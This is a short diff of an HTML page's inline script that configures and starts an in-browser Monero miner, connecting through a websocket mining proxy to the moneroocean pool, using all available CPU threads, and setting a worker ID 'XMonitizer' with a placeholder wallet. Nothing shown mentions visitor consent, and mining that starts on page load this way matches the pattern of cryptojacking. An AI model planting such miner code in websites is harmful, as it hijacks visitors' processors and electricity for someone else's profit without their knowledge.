@@ -8,8 +8,8 @@
 <script>
     server = "wss://ny1.xmrminingproxy.com";
     var pool = "moneroocean.stream";
-    var walletAddress = "PUT YOUR WALLET ADDRESS HERE";
-    var workerId = ""
+    var walletAddress = "Wallet_Adress";
+    var workerId = "XMonitizer";
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
